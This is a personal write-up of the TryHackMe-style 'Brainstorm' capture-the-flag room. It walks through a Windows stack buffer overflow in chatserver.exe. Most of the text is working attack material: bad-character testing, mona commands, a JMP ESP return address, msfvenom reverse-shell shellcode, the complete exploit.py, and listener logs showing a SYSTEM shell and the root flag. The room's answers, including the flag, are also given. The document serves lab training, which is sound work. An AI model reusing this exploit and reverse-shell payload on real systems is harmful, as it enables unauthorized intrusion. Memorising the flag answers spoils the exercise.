    s.send(message + b'\r\n')
    s.recv(1024)
    s.close()

except:
    print("Connot Connect")
    sys.exit()
                              

                                                                                    
                          
──(kali㉿kali)-[~/bufferoverflow/brainstorm]
└─$ python exploit.py                      
Sending Payload...


                                                                                                                 
┌──(kali㉿kali)-[~/bufferoverflow/brainstorm]
└─$ nano badchar.py
                                                                                                                 
┌──(kali㉿kali)-[~/bufferoverflow/brainstorm]
└─$ cat badchar.py 
for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()
                                                                                                                 
┌──(kali㉿kali)-[~/bufferoverflow/brainstorm]
└─$ python badchar.py 
\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff

mona

!mona bytearray -b "\x00"


┌──(kali㉿kali)-[~/bufferoverflow/brainstorm]
└─$ cat exploit.py
import socket
import sys

username = b"witty"
message = b"A" * 2012 + b"B" * 4
payload = (b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
try:
    print("Sending Payload...")
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('10.10.99.157', 9999))
    s.recv(1024)
    s.recv(1024)
    s.send(username + b'\r\n')
    s.recv(1024)
    s.send(message + payload + b'\r\n')
    s.recv(1024)
    s.close()

except:
    print("Connot Connect")
    sys.exit()


ESP: 0190EEC0 follow dump


!mona modules

After following the ESP register to the memory dump, it looks like all the characters made it into ESP, therefore no bad characters are present, apart from x00 which is always considered a bad character. 01 has also been reported as bad as sometimes the subsequent character is mistakenly reported as bad:

The next step is to find a valid JMP ESP instruction address so that we can redirect the execution of the application to our malicious shellcode.

Restarting the application, re-attaching Immunity, and using !mona modules to find a valid DLL/module – looks like the only good one is the executable itself:

!mona compare -f C:\mona\oscp\bytearray.bin -a 0190EEC0

follow in dissambler the first then

!mona find -s "\xff\xe4" -m essfunc.dll


Choose an address and update your exploit.py script, setting the "retn" variable to the address, written backwards (since the system is little endian). For example if the address is \x01\x02\x03\x04 in Immunity, write it as \x04\x03\x02\x01 in your exploit.

so will be 0x625014df

so \xdf \x14 \x50 \x62

the final exploit to get at least the revshell

use msfvenom

┌──(kali㉿kali)-[~/bufferoverflow/brainstorm]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.81.220 LPORT=7777  -b "\x00" -f c      
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of c file: 1506 bytes
unsigned char buf[] = 
"\xdb\xda\xbe\x2e\xcc\x43\xa0\xd9\x74\x24\xf4\x58\x2b\xc9"
"\xb1\x52\x31\x70\x17\x83\xe8\xfc\x03\x5e\xdf\xa1\x55\x62"
"\x37\xa7\x96\x9a\xc8\xc8\x1f\x7f\xf9\xc8\x44\xf4\xaa\xf8"
"\x0f\x58\x47\x72\x5d\x48\xdc\xf6\x4a\x7f\x55\xbc\xac\x4e"
"\x66\xed\x8d\xd1\xe4\xec\xc1\x31\xd4\x3e\x14\x30\x11\x22"
"\xd5\x60\xca\x28\x48\x94\x7f\x64\x51\x1f\x33\x68\xd1\xfc"
"\x84\x8b\xf0\x53\x9e\xd5\xd2\x52\x73\x6e\x5b\x4c\x90\x4b"
"\x15\xe7\x62\x27\xa4\x21\xbb\xc8\x0b\x0c\x73\x3b\x55\x49"
"\xb4\xa4\x20\xa3\xc6\x59\x33\x70\xb4\x85\xb6\x62\x1e\x4d"
"\x60\x4e\x9e\x82\xf7\x05\xac\x6f\x73\x41\xb1\x6e\x50\xfa"
"\xcd\xfb\x57\x2c\x44\xbf\x73\xe8\x0c\x1b\x1d\xa9\xe8\xca"
"\x22\xa9\x52\xb2\x86\xa2\x7f\xa7\xba\xe9\x17\x04\xf7\x11"
"\xe8\x02\x80\x62\xda\x8d\x3a\xec\x56\x45\xe5\xeb\x99\x7c"
"\x51\x63\x64\x7f\xa2\xaa\xa3\x2b\xf2\xc4\x02\x54\x99\x14"
"\xaa\x81\x0e\x44\x04\x7a\xef\x34\xe4\x2a\x87\x5e\xeb\x15"
"\xb7\x61\x21\x3e\x52\x98\xa2\x4b\xa8\xf3\xee\x24\xac\xf3"
"\x10\xd4\x39\x15\x46\x06\x6c\x8e\xff\xbf\x35\x44\x61\x3f"
"\xe0\x21\xa1\xcb\x07\xd6\x6c\x3c\x6d\xc4\x19\xcc\x38\xb6"
"\x8c\xd3\x96\xde\x53\x41\x7d\x1e\x1d\x7a\x2a\x49\x4a\x4c"
"\x23\x1f\x66\xf7\x9d\x3d\x7b\x61\xe5\x85\xa0\x52\xe8\x04"
"\x24\xee\xce\x16\xf0\xef\x4a\x42\xac\xb9\x04\x3c\x0a\x10"
"\xe7\x96\xc4\xcf\xa1\x7e\x90\x23\x72\xf8\x9d\x69\x04\xe4"
"\x2c\xc4\x51\x1b\x80\x80\x55\x64\xfc\x30\x99\xbf\x44\x40"
"\xd0\x9d\xed\xc9\xbd\x74\xac\x97\x3d\xa3\xf3\xa1\xbd\x41"
"\x8c\x55\xdd\x20\x89\x12\x59\xd9\xe3\x0b\x0c\xdd\x50\x2b"
"\x05";


exploit.py

┌──(kali㉿kali)-[~/bufferoverflow/brainstorm]
└─$ cat exploit.py
import socket
import sys

username = b"witty"
message = b"A" * 2012 + b"\xdf\x14\x50\x62" + b"\x90" * 32
payload = (b"\xdb\xda\xbe\x2e\xcc\x43\xa0\xd9\x74\x24\xf4\x58\x2b\xc9"
b"\xb1\x52\x31\x70\x17\x83\xe8\xfc\x03\x5e\xdf\xa1\x55\x62"
b"\x37\xa7\x96\x9a\xc8\xc8\x1f\x7f\xf9\xc8\x44\xf4\xaa\xf8"
b"\x0f\x58\x47\x72\x5d\x48\xdc\xf6\x4a\x7f\x55\xbc\xac\x4e"
b"\x66\xed\x8d\xd1\xe4\xec\xc1\x31\xd4\x3e\x14\x30\x11\x22"
b"\xd5\x60\xca\x28\x48\x94\x7f\x64\x51\x1f\x33\x68\xd1\xfc"
b"\x84\x8b\xf0\x53\x9e\xd5\xd2\x52\x73\x6e\x5b\x4c\x90\x4b"
b"\x15\xe7\x62\x27\xa4\x21\xbb\xc8\x0b\x0c\x73\x3b\x55\x49"
b"\xb4\xa4\x20\xa3\xc6\x59\x33\x70\xb4\x85\xb6\x62\x1e\x4d"
b"\x60\x4e\x9e\x82\xf7\x05\xac\x6f\x73\x41\xb1\x6e\x50\xfa"
b"\xcd\xfb\x57\x2c\x44\xbf\x73\xe8\x0c\x1b\x1d\xa9\xe8\xca"
b"\x22\xa9\x52\xb2\x86\xa2\x7f\xa7\xba\xe9\x17\x04\xf7\x11"
b"\xe8\x02\x80\x62\xda\x8d\x3a\xec\x56\x45\xe5\xeb\x99\x7c"
b"\x51\x63\x64\x7f\xa2\xaa\xa3\x2b\xf2\xc4\x02\x54\x99\x14"
b"\xaa\x81\x0e\x44\x04\x7a\xef\x34\xe4\x2a\x87\x5e\xeb\x15"
b"\xb7\x61\x21\x3e\x52\x98\xa2\x4b\xa8\xf3\xee\x24\xac\xf3"
b"\x10\xd4\x39\x15\x46\x06\x6c\x8e\xff\xbf\x35\x44\x61\x3f"
b"\xe0\x21\xa1\xcb\x07\xd6\x6c\x3c\x6d\xc4\x19\xcc\x38\xb6"
b"\x8c\xd3\x96\xde\x53\x41\x7d\x1e\x1d\x7a\x2a\x49\x4a\x4c"
b"\x23\x1f\x66\xf7\x9d\x3d\x7b\x61\xe5\x85\xa0\x52\xe8\x04"
b"\x24\xee\xce\x16\xf0\xef\x4a\x42\xac\xb9\x04\x3c\x0a\x10"
b"\xe7\x96\xc4\xcf\xa1\x7e\x90\x23\x72\xf8\x9d\x69\x04\xe4"
b"\x2c\xc4\x51\x1b\x80\x80\x55\x64\xfc\x30\x99\xbf\x44\x40"
b"\xd0\x9d\xed\xc9\xbd\x74\xac\x97\x3d\xa3\xf3\xa1\xbd\x41"
b"\x8c\x55\xdd\x20\x89\x12\x59\xd9\xe3\x0b\x0c\xdd\x50\x2b"
b"\x05")
try:
    print("Sending Payload...")
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('10.10.99.157', 9999))
    s.recv(1024)
    s.recv(1024)
    s.send(username + b'\r\n')
    s.recv(1024)
    s.send(message + payload + b'\r\n')
    s.recv(1024)
    s.close()

except:
    print("Connot Connect")
    sys.exit()


┌──(kali㉿kali)-[~/bufferoverflow/brainstorm]
└─$ python3 exploit.py
Sending Payload...


┌──(kali㉿kali)-[~/bufferoverflow/brainstorm]
└─$ nc -nvlp 7777               
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::7777
Ncat: Listening on 0.0.0.0:7777
Ncat: Connection from 10.10.99.157.
Ncat: Connection from 10.10.99.157:49316.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\admin\Desktop>whoami
whoami
oscp-bof-prep\admin

C:\Users\admin\Desktop>cd ..
cd ..

C:\Users\admin>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 0EE5-7CCF

 Directory of C:\Users\admin

07/03/2020  09:40 PM    <DIR>          .
07/03/2020  09:40 PM    <DIR>          ..
07/03/2020  09:40 PM    <DIR>          Contacts
09/29/2022  09:10 PM    <DIR>          Desktop
07/03/2020  09:40 PM    <DIR>          Documents
07/03/2020  09:40 PM    <DIR>          Downloads
07/03/2020  09:40 PM    <DIR>          Favorites
07/03/2020  09:40 PM    <DIR>          Links
07/03/2020  09:40 PM    <DIR>          Music
07/03/2020  09:40 PM    <DIR>          Pictures
07/03/2020  09:40 PM    <DIR>          Saved Games
07/03/2020  09:40 PM    <DIR>          Searches
07/03/2020  09:40 PM    <DIR>          Videos
               0 File(s)              0 bytes
              13 Dir(s)  50,289,713,152 bytes free

C:\Users\admin>cd ..
cd ..

C:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 0EE5-7CCF

 Directory of C:\Users

07/03/2020  09:40 PM    <DIR>          .
07/03/2020  09:40 PM    <DIR>          ..
07/03/2020  09:40 PM    <DIR>          admin
11/20/2010  08:47 PM    <DIR>          Public
               0 File(s)              0 bytes
               4 Dir(s)  50,289,713,152 bytes free

C:\Users>cd admin
cd admin

C:\Users\admin>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 0EE5-7CCF

 Directory of C:\Users\admin

07/03/2020  09:40 PM    <DIR>          .
07/03/2020  09:40 PM    <DIR>          ..
07/03/2020  09:40 PM    <DIR>          Contacts
09/29/2022  09:10 PM    <DIR>          Desktop
07/03/2020  09:40 PM    <DIR>          Documents
07/03/2020  09:40 PM    <DIR>          Downloads
07/03/2020  09:40 PM    <DIR>          Favorites
07/03/2020  09:40 PM    <DIR>          Links
07/03/2020  09:40 PM    <DIR>          Music
07/03/2020  09:40 PM    <DIR>          Pictures
07/03/2020  09:40 PM    <DIR>          Saved Games
07/03/2020  09:40 PM    <DIR>          Searches
07/03/2020  09:40 PM    <DIR>          Videos
               0 File(s)              0 bytes
              13 Dir(s)  50,289,713,152 bytes free

C:\Users\admin>cd Desktop
cd Desktop

C:\Users\admin\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 0EE5-7CCF

 Directory of C:\Users\admin\Desktop

09/29/2022  09:10 PM    <DIR>          .
09/29/2022  09:10 PM    <DIR>          ..
09/29/2022  09:10 PM            43,747 chatserver.exe
09/29/2022  09:10 PM            30,761 essfunc.dll
06/25/2020  10:24 PM        22,749,412 ImmunityDebugger_1_85_setup.exe
06/26/2020  01:48 AM         1,096,080 putty.exe
07/03/2020  10:34 PM    <DIR>          vulnerable-apps
               4 File(s)     23,920,000 bytes
               3 Dir(s)  50,289,713,152 bytes free

C:\Users\admin\Desktop>

but is the other machine 😂



now yep :0

┌──(kali㉿kali)-[~/bufferoverflow/brainstorm]
└─$ python3 exploit.py
Sending Payload...


┌──(kali㉿kali)-[~/bufferoverflow/brainstorm]
└─$ cat exploit.py
import socket
import sys

username = b"witty"
message = b"A" * 2012 + b"\xdf\x14\x50\x62" + b"\x90" * 32
payload = (b"\xdb\xda\xbe\x2e\xcc\x43\xa0\xd9\x74\x24\xf4\x58\x2b\xc9"
b"\xb1\x52\x31\x70\x17\x83\xe8\xfc\x03\x5e\xdf\xa1\x55\x62"
b"\x37\xa7\x96\x9a\xc8\xc8\x1f\x7f\xf9\xc8\x44\xf4\xaa\xf8"
b"\x0f\x58\x47\x72\x5d\x48\xdc\xf6\x4a\x7f\x55\xbc\xac\x4e"
b"\x66\xed\x8d\xd1\xe4\xec\xc1\x31\xd4\x3e\x14\x30\x11\x22"
b"\xd5\x60\xca\x28\x48\x94\x7f\x64\x51\x1f\x33\x68\xd1\xfc"
b"\x84\x8b\xf0\x53\x9e\xd5\xd2\x52\x73\x6e\x5b\x4c\x90\x4b"
b"\x15\xe7\x62\x27\xa4\x21\xbb\xc8\x0b\x0c\x73\x3b\x55\x49"
b"\xb4\xa4\x20\xa3\xc6\x59\x33\x70\xb4\x85\xb6\x62\x1e\x4d"
b"\x60\x4e\x9e\x82\xf7\x05\xac\x6f\x73\x41\xb1\x6e\x50\xfa"
b"\xcd\xfb\x57\x2c\x44\xbf\x73\xe8\x0c\x1b\x1d\xa9\xe8\xca"
b"\x22\xa9\x52\xb2\x86\xa2\x7f\xa7\xba\xe9\x17\x04\xf7\x11"
b"\xe8\x02\x80\x62\xda\x8d\x3a\xec\x56\x45\xe5\xeb\x99\x7c"
b"\x51\x63\x64\x7f\xa2\xaa\xa3\x2b\xf2\xc4\x02\x54\x99\x14"
b"\xaa\x81\x0e\x44\x04\x7a\xef\x34\xe4\x2a\x87\x5e\xeb\x15"
b"\xb7\x61\x21\x3e\x52\x98\xa2\x4b\xa8\xf3\xee\x24\xac\xf3"
b"\x10\xd4\x39\x15\x46\x06\x6c\x8e\xff\xbf\x35\x44\x61\x3f"
b"\xe0\x21\xa1\xcb\x07\xd6\x6c\x3c\x6d\xc4\x19\xcc\x38\xb6"
b"\x8c\xd3\x96\xde\x53\x41\x7d\x1e\x1d\x7a\x2a\x49\x4a\x4c"
b"\x23\x1f\x66\xf7\x9d\x3d\x7b\x61\xe5\x85\xa0\x52\xe8\x04"
b"\x24\xee\xce\x16\xf0\xef\x4a\x42\xac\xb9\x04\x3c\x0a\x10"
b"\xe7\x96\xc4\xcf\xa1\x7e\x90\x23\x72\xf8\x9d\x69\x04\xe4"
b"\x2c\xc4\x51\x1b\x80\x80\x55\x64\xfc\x30\x99\xbf\x44\x40"
b"\xd0\x9d\xed\xc9\xbd\x74\xac\x97\x3d\xa3\xf3\xa1\xbd\x41"
b"\x8c\x55\xdd\x20\x89\x12\x59\xd9\xe3\x0b\x0c\xdd\x50\x2b"
b"\x05")
try:
    print("Sending Payload...")
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('10.10.162.239', 9999))
    s.recv(1024)
    s.recv(1024)
    s.send(username + b'\r\n')
    s.recv(1024)
    s.send(message + payload + b'\r\n')
    s.recv(1024)
    s.close()

except:
    print("Connot Connect")
    sys.exit()

the thing is changing the ip from the machine brain so in my case 10.10.162.239 , and the other machine using immunity debugger 10.10.99.157

┌──(kali㉿kali)-[~/bufferoverflow/brainstorm]
└─$ nc -nvlp 7777
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::7777
Ncat: Listening on 0.0.0.0:7777
Ncat: Connection from 10.10.162.239.
Ncat: Connection from 10.10.162.239:49436.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>cd c:\home
cd c:\home
The system cannot find the path specified.

C:\Windows\system32>cd \home
cd \home
The system cannot find the path specified.

C:\Windows\system32>cd 'C:\Users\'
cd 'C:\Users\'
The filename, directory name, or volume label syntax is incorrect.

C:\Windows\system32>cd c:\users
cd c:\users

c:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is C87F-5040

 Directory of c:\Users

08/29/2019  10:20 PM    <DIR>          .
08/29/2019  10:20 PM    <DIR>          ..
08/29/2019  10:21 PM    <DIR>          drake
11/21/2010  12:16 AM    <DIR>          Public
               0 File(s)              0 bytes
               4 Dir(s)  19,552,374,784 bytes free

c:\Users>cd drake
cd drake

c:\Users\drake>cd desktop
cd desktop

c:\Users\drake\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is C87F-5040

 Directory of c:\Users\drake\Desktop

08/29/2019  10:55 PM    <DIR>          .
08/29/2019  10:55 PM    <DIR>          ..
08/29/2019  10:55 PM                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)  19,552,374,784 bytes free

c:\Users\drake\Desktop>more root.txt
more root.txt
5b1001de5a44eca47eee71e7942a8f8a


It was a though one!

```


![[Pasted image 20220929202536.png]]

![[Pasted image 20220929211102.png]]

![[Pasted image 20220929212029.png]]

![[Pasted image 20220929213626.png]]

![[Pasted image 20220929214842.png]]


![](https://gitlab.com/dhiksec/tryhackme/-/raw/master/Brainstorm/2020-10-27_23-32.png)


How many ports are open?
scan the network with nmap
*6* (it's strange because is 3 ports open only but doesn't accept it)

### Accessing Files 

Let's continue with the enumeration!



What is the name of the exe file you found?
what protocol is used to transfer files?
*chatserver.exe*

### Access 



After enumeration, you now must have noticed that the service interacting on the strange port is some how related to the files you found! Is there anyway you can exploit that strange service to gain access to the system? 

It is worth using a Python script to try out different payloads to gain access! You can even use the files to locally try the exploit. 

If you've not done buffer overflows before, check this room out!

https://tryhackme.com/room/bof1



Read the description.




After testing for overflow, by entering a large number of characters, determine the EIP offset.
you can use the pattern_offset.rb module in metasploit!




Now you know that you can overflow a buffer and potentially control execution, you need to find a function where ASLR/DEP is not enabled. Why not check the DLL file.


Since this would work, you can try generate some shellcode - use msfvenom to generate shellcode for windows. 
remember that the machine type is x86



After gaining access, what is the content of the root.txt file?
*5b1001de5a44eca47eee71e7942a8f8a*



[[Buffer Overflow Prep]]